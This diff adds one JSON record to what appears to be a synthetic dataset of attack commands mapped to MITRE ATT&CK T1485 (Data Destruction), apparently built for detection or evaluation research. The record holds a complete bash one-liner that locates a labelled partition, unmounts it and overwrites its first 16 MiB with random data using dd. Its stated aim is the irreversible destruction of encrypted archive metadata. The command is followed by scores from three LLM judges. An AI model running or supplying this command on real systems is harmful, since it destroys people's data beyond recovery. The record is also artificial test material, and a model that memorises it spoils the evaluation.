@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'dev=$(blkid -L SECURE_ARCHIVE); [ -n \"$dev\" ] && { umount \"$dev\" 2>/dev/null || true; dd if=/dev/urandom of=\"$dev\" bs=1M count=16 oflag=direct status=progress; }'",
+  "explanation": "Corrupts a targeted encrypted/archive partition by overwriting the first 16 MiB, destroying critical metadata.",
+  "rationale_steps": [
+    "Resolve the device by label",
+    "Unmount to avoid active writes",
+    "Overwrite initial blocks where headers/metadata reside",
+    "Use random data for irreversible corruption"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-a111c1c9",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct use of subshells, variable assignments, and conditional logic.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by identifying a specific partition labeled 'SECURE_ARCHIVE', unmounting it if mounted, and then deliberately overwriting its critical metadata with random data using dd, which would render the data unrecoverable.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T01:45:48.126774Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, correct command separators (;, &&, ||), valid flags for all utilities (blkid, umount, dd), and proper command substitution.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's design and use of tools (blkid, umount, dd /dev/urandom) are perfectly aligned with the T1485 data destruction technique by targeting critical partition metadata, it cannot achieve its claimed intent of corrupting a partition under the specified 'Privilege: None' as `umount` and `dd` to a raw device typically require root privileges.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:45:59.710931Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash with balanced quotes and braces, proper test and grouping, and valid dd options.",
+        "semantic_score": 3,
+        "semantic_justification": "It correctly attempts to overwrite the first 16 MiB of the target device to corrupt metadata, but without elevated privileges the umount and dd operations will likely fail.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:46:06.544077Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
